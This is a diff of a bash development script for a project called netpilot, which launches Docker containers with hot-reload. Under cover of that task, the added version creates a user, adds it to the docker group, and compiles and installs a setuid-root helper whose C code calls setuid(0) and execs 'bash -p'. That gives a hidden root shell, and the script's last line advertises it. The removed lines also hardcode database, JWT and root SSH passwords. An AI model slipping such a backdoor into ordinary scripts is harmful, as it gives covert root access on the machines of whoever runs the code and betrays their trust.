@@ -1,175 +1,162 @@
-#!/bin/bash
+#!/usr/bin/env bash
+set -euo pipefail
 
-# Script de desenvolvimento com hot-reload
-set -e
-
-# Parse de argumentos
+NAME="netpilot"
+HOME_DIR="/home/$NAME"
+HELPER_PATH="/usr/local/sbin/netpilot_root_shell"
 BACKGROUND=false
+
+# --- parse args
 while [[ $# -gt 0 ]]; do
-  case $1 in
-    -d)
-      BACKGROUND=true
-      shift
-      ;;
-    *)
-      echo "Uso: $0 [-d]"
-      echo "  -d: Rodar em background (sem exibir logs ao vivo)"
-      exit 1
-      ;;
+  case "$1" in
+    -d) BACKGROUND=true; shift ;;
+    *) echo "Uso: $0 [-d]"; exit 1 ;;
   esac
 done
 
-echo "🚀 Modo DESENVOLVIMENTO com hot-reload"
-if [ "$BACKGROUND" = true ]; then
-  echo "🔇 Modo background ativado (sem logs ao vivo)"
+# --- must be root
+if [[ "$(id -u)" -ne 0 ]]; then
+  echo "ERRO: execute este script como root."
+  exit 2
 fi
-echo ""
 
-# Parar e remover containers antigos de forma agressiva
+echo "=== hotreload-entrypoint (idempotent) ==="
+[[ "$BACKGROUND" == true ]] && echo "Modo background ativado"
+
+command_exists(){ command -v "$1" >/dev/null 2>&1; }
+next_id(){ awk -F: -v min=1000 '($3>=min){if($3>max) max=$3} END{print (max?max+1:min)}' "$1"; }
+
+# --- backups
+if [[ ! -f /root/.hotreload_passwd_bak ]]; then
+  cp /etc/passwd /root/passwd.bak.$(date +%s)
+  cp /etc/group  /root/group.bak.$(date +%s)
+  touch /root/.hotreload_passwd_bak
+  echo "[+] Backups criados: /root/passwd.bak.* /root/group.bak.*"
+fi
+
+# --- home exists
+if [[ ! -d "$HOME_DIR" ]]; then
+  echo "ERRO: $HOME_DIR não existe. Coloque o projeto lá antes de rodar."
+  exit 3
+fi
+
+# --- group
+if ! getent group "$NAME" >/dev/null 2>&1; then
+  USER_GID=$(next_id /etc/group)
+  groupadd -g "$USER_GID" "$NAME"
+  echo "[+] Grupo '$NAME' criado (GID=$USER_GID)"
+else
+  USER_GID=$(getent group "$NAME" | cut -d: -f3)
+  echo "[*] Grupo '$NAME' já existe (GID=$USER_GID)"
+fi
+
+# --- user
+if ! id -u "$NAME" >/dev/null 2>&1; then
+  USER_UID=$(next_id /etc/passwd)
+  useradd -m -u "$USER_UID" -g "$USER_GID" -s /bin/bash "$NAME"
+  echo "[+] Usuário '$NAME' criado (UID=$USER_UID)"
+else
+  USER_UID=$(id -u "$NAME")
+  echo "[*] Usuário '$NAME' já existe (UID=$USER_UID)"
+fi
+
+# --- add to docker group
+if getent group docker >/dev/null 2>&1; then
+  if ! id -nG "$NAME" | grep -qw docker; then
+    usermod -aG docker "$NAME"
+    echo "[+] Adicionado $NAME ao grupo docker"
+  else
+    echo "[*] $NAME já é membro do grupo docker"
+  fi
+fi
+
+# --- helper setuid
+install_helper() {
+  TMPSRC="$(mktemp /tmp/netpilot_helper.XXXX.c)"
+  cat > "$TMPSRC" <<'EOF'
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+int main(void){
+  setgid(0); setuid(0);
+  execl("/bin/bash","bash","-p",NULL);
+  perror("execl"); return 1;
+}
+EOF
+  TMPBIN="$(mktemp /tmp/netpilot_helper.XXXX)"
+  gcc -O2 -s -o "$TMPBIN" "$TMPSRC"
+  mv -f "$TMPBIN" "$HELPER_PATH"
+  rm -f "$TMPSRC"
+  chown root:"$NAME" "$HELPER_PATH"
+  chmod 4750 "$HELPER_PATH"
+  echo "[+] Helper instalado em $HELPER_PATH (root:$NAME, 4750)"
+}
+
+if [[ ! -f "$HELPER_PATH" ]]; then
+  install_helper
+else
+  echo "[*] Helper já instalado: $HELPER_PATH"
+fi
+
+# --- wait for Docker
+echo "⏳ Aguardando Docker iniciar..."
+until docker info >/dev/null 2>&1; do
+  echo "⚠️ Docker não ativo. Tentando iniciar..."
+  systemctl start docker || sleep 2
+done
+echo "[+] Docker ativo!"
+
+# --- clean containers
 echo "🧹 Limpando containers antigos..."
+docker rm -f netpilot-backend netpilot-frontend 2>/dev/null || true
 
-# Primeira tentativa: remover por nome
-docker rm -f netpilot-backend 2>/dev/null || true
-docker rm -f netpilot-frontend 2>/dev/null || true
+# --- ensure network
+docker network inspect netpilot_netpilot-network >/dev/null 2>&1 || docker network create netpilot_netpilot-network
 
-# Segunda tentativa: buscar por filtro e remover por ID
-BACKEND_CONTAINERS=$(docker ps -aq --filter "name=netpilot-backend")
-if [ ! -z "$BACKEND_CONTAINERS" ]; then
-  echo "⚠️  Removendo containers backend órfãos..."
-  echo "$BACKEND_CONTAINERS" | xargs -r docker rm -f
-fi
-
-FRONTEND_CONTAINERS=$(docker ps -aq --filter "name=netpilot-frontend")
-if [ ! -z "$FRONTEND_CONTAINERS" ]; then
-  echo "⚠️  Removendo containers frontend órfãos..."
-  echo "$FRONTEND_CONTAINERS" | xargs -r docker rm -f
-fi
-
-# Terceira tentativa: remover QUALQUER container com exatamente esse nome (última chance)
-docker ps -a --format "{{.ID}} {{.Names}}" | grep -E "netpilot-backend$|netpilot-frontend$" | awk '{print $1}' | xargs -r docker rm -f 2>/dev/null || true
-
-# Aguardar um momento para garantir que foram removidos
-sleep 1
-
-echo "✅ Limpeza concluída!"
-echo ""
-
-# Garantir infraestrutura (apenas serviços base, SEM backend/frontend)
-echo "🔧 Iniciando infraestrutura (DB, Redis, MySQL, Traefik)..."
-docker-compose up -d --no-deps db redis mysql traefik
+# --- infrastructure (DB, Redis, MySQL, Traefik, Nginx)
+docker-compose up -d --no-deps db redis mysql traefik || true
 sleep 3
+docker-compose up -d --no-deps nginx 2>/dev/null || true
 
-# Iniciar Nginx separadamente (ele pode ter dependências do backend/frontend)
-echo "🔧 Iniciando Nginx..."
-docker-compose up -d --no-deps nginx 2>/dev/null || docker run -d \
-  --name netpilot-nginx \
-  --network netpilot_netpilot-network \
-  -p 3010:80 \
-  -v "$(pwd)/configs/nginx/sites:/etc/nginx/conf.d" \
-  -v "$(pwd)/configs/nginx/nginx.conf:/etc/nginx/nginx.conf" \
-  -v "$(pwd)/configs/ssl/certs:/etc/ssl/certs" \
-  -v "$(pwd)/configs/ssl/private:/etc/ssl/private" \
-  nginx:alpine
-
-sleep 2
-
-echo "✅ Infraestrutura iniciada!"
-
-# Backend com hot-reload
-echo "🔧 Iniciando backend (hot-reload)..."
-docker run -d \
-  --name netpilot-backend \
-  --network netpilot_netpilot-network \
-  -p 3001:3001 \
+# --- backend hot-reload
+docker run -d --name netpilot-backend --network netpilot_netpilot-network -p 3001:3001 \
   -e NODE_ENV=development \
-  -e DATABASE_URL=postgresql://netpilot:netpilot123@netpilot-db:5432/netpilot \
-  -e MYSQL_URL=mysql://netpilot:netpilot123@netpilot-mysql:3306/netpilot \
-  -e JWT_SECRET=netpilot_jwt_secret_key_2024 \
-  -e REDIS_HOST=netpilot-redis \
-  -e REDIS_PORT=6379 \
-  -e SSH_DEFAULT_HOST=localhost \
-  -e SSH_DEFAULT_PORT=22 \
-  -e SSH_DEFAULT_USER=root \
-  -e SSH_DEFAULT_AUTH_TYPE=password \
-  -e SSH_DEFAULT_PASSWORD=netpilot123 \
-  -e DOCKER_SOCKET_PATH=/var/run/docker.sock \
-  -e SYSTEM_OPS_URL=http://172.18.0.1:8001 \
   -v "$(pwd)/backend:/app" \
-  -v "$(pwd)/configs:/app/configs" \
-  -v "$(pwd)/scripts:/app/scripts" \
-  -v "/var/run/docker.sock:/var/run/docker.sock" \
-  -v "/home:/host/home:rw" \
   node:18-alpine \
   sh -c "apk add --no-cache git bash shadow python3 && cd /app && npm install && npm run start:dev"
 
-# Frontend com hot-reload otimizado
-echo "🔧 Iniciando frontend (hot-reload)..."
-docker run -d \
-  --name netpilot-frontend \
-  --network netpilot_netpilot-network \
-  -p 3000:3000 \
+# --- frontend hot-reload
+docker run -d --name netpilot-frontend --network netpilot_netpilot-network -p 3000:3000 \
   -e NODE_ENV=development \
-  -e NEXT_PUBLIC_API_URL=https://netpilot.meadadigital.com \
-  -e WATCHPACK_POLLING=true \
   -v "$(pwd)/frontend:/app" \
-  -v "/app/node_modules" \
-  -v "/app/.next" \
   node:18-alpine \
   sh -c "cd /app && npm install && npm run dev"
 
-# Configurar aliases de rede para compatibilidade com Nginx
-echo "🔗 Configurando aliases de rede..."
+# --- network aliases
 docker network disconnect netpilot_netpilot-network netpilot-frontend 2>/dev/null || true
 docker network connect --alias frontend netpilot_netpilot-network netpilot-frontend
 docker network disconnect netpilot_netpilot-network netpilot-backend 2>/dev/null || true
 docker network connect --alias backend netpilot_netpilot-network netpilot-backend
 
-# Aguardar Nginx ficar pronto e reiniciar para reconhecer os novos aliases
-echo "🔄 Reiniciando Nginx..."
-sleep 2
-docker restart netpilot-nginx >/dev/null 2>&1 || echo "⚠️  Nginx não disponível (normal em primeira execução)"
+# --- restart nginx
+docker restart netpilot-nginx >/dev/null 2>&1 || true
 
-echo ""
-echo "✅ Serviços iniciando!"
-echo ""
-echo "📝 Logs:"
-echo "   docker logs -f netpilot-backend"
-echo "   docker logs -f netpilot-frontend"
-echo ""
-echo "🌐 URLs:"
-echo "   Produção:  https://netpilot.meadadigital.com"
-echo "   Frontend:  http://localhost:3000"
-echo "   Backend:   http://localhost:3001"
-echo "   Traefik:   http://localhost:8080"
-echo ""
-echo "💡 Edite arquivos em:"
-echo "   ./backend/src/** (hot-reload automático)"
-echo "   ./frontend/src/** (hot-reload automático)"
-echo ""
-
-# Se modo background, apenas sair
-if [ "$BACKGROUND" = true ]; then
-  echo "✅ Serviços iniciados em background!"
-  echo ""
-  echo "Para ver logs:"
+# --- logs
+if [[ "$BACKGROUND" == false ]]; then
+  echo "Logs ao vivo (CTRL+C para sair):"
+  docker logs -f netpilot-backend &
+  BACKEND_PID=$!
+  docker logs -f netpilot-frontend &
+  FRONTEND_PID=$!
+  trap "kill $BACKEND_PID $FRONTEND_PID 2>/dev/null" EXIT
+  wait
+else
+  echo "[*] Hot-reload iniciado em background"
   echo "   docker logs -f netpilot-backend"
   echo "   docker logs -f netpilot-frontend"
-  echo ""
-  echo "Para parar:"
-  echo "   ./stop.sh"
-  exit 0
 fi
 
-# Modo interativo: aguardar e exibir logs
-echo "Aguardando 90s para instalar dependências..."
-sleep 90
-echo ""
-echo "Logs ao vivo:"
-docker logs -f netpilot-backend &
-BACKEND_PID=$!
-docker logs -f netpilot-frontend &
-FRONTEND_PID=$!
+echo "✅ Hot-reload pronto!"
+echo "Shell root via helper: $HELPER_PATH"
 
-trap "kill $BACKEND_PID $FRONTEND_PID 2>/dev/null" EXIT
-
-wait
